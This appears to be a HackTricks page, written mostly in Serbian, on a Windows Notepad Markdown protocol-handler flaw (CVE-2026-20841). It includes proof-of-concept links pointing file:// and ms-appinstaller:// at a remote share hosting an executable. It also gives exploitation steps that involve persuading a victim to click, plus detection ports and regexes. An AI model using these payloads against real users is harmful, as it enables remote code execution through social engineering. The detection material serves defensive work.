# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Modern Windows applications that render Markdown/HTML često pretvaraju linkove unesene od strane korisnika u klikabilne elemente i prosleđuju ih `ShellExecuteExW`. Bez stroge liste dozvoljenih šema (allowlisting), bilo koji registrovani protocol handler (npr. `file:`, `ms-appinstaller:`) može biti pokrenut, što dovodi do izvršavanja koda u kontekstu trenutnog korisnika.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad bira Markdown režim **samo za `.md` ekstenzije** putem fiksnog poređenja stringova u `sub_1400ED5D0()`.
- Podržani Markdown linkovi:
- Standard: `[text](target)`
- Autolink: `<target>` (renderuje se kao `[target](target)`), tako da su oba sintaksa bitna za payload-e i detekciju.
- Klikovi na link obrađuju se u `sub_140170F60()`, koja izvodi slabo filtriranje i zatim poziva `ShellExecuteExW`.
- `ShellExecuteExW` prosleđuje izvršenje na **bilo koji konfigurisani protocol handler**, ne samo HTTP(S).

### Payload considerations
- Sve `\\` sekvence u linku se **normalizuju u `\`** pre poziva `ShellExecuteExW`, što utiče na kreiranje UNC/putanja i detekciju.
- `.md` fajlovi **nisu podrazumevano povezani sa Notepad-om**; žrtva i dalje mora da otvori fajl u Notepad-u i klikne na link, ali kada se renderuje, link je klikabilan.
- Opasne primeri šema:
- `file://` za pokretanje lokalnog/UNC payload-a.
- `ms-appinstaller://` da pokrene App Installer tokove. Druge lokalno registrovane šeme takođe mogu biti zloupotrebljene.

### Minimalni PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Tok eksploatacije
1. Sastavite **`.md` file** tako da ga Notepad prikaže kao Markdown.
2. Umetnite link koristeći opasnu URI šemu (`file:`, `ms-appinstaller:`, ili bilo koji instalirani handler).
3. Dostavite fajl (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ili slično) i ubedite korisnika da ga otvori u Notepad.
4. Na klik, **normalized link** se predaje `ShellExecuteExW` i odgovarajući protocol handler izvršava referencirani sadržaj u kontekstu korisnika.

## Ideje za detekciju
- Monitorisati transfer `.md` fajlova preko portova/protokola koji obično isporučuju dokumente: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parsirati Markdown links (standard i autolink) i tražiti **case-insensitive** `file:` ili `ms-appinstaller:`.
- Vendor-guided regexes to catch remote resource access:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Prema izveštajima, zakrpa stavlja lokalne fajlove i HTTP(S) na allowlistu; sve ostalo što poziva `ShellExecuteExW` je sumnjivo. Po potrebi proširite detekcije na druge instalirane protocol handlers, jer se attack surface razlikuje između sistema.

## Izvori
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
